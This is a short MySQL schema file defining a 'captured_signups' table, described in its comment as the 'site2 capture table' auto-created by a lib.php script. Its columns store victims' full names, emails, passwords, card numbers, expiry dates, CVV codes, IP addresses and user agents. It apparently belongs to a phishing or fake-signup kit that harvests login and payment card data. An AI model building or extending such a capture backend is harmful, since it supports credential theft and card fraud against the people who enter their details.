-- site2 capture table (auto-created by lib.php on first run; here for reference).
CREATE TABLE IF NOT EXISTS captured_signups (
    id           BIGINT AUTO_INCREMENT PRIMARY KEY,
    full_name    VARCHAR(200),
    email        VARCHAR(320),
    password     VARCHAR(512),
    plan         VARCHAR(40),
    card_number  VARCHAR(40),
    card_exp     VARCHAR(10),
    card_cvv     VARCHAR(8),
    ip           VARCHAR(64),
    user_agent   VARCHAR(512),
    created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
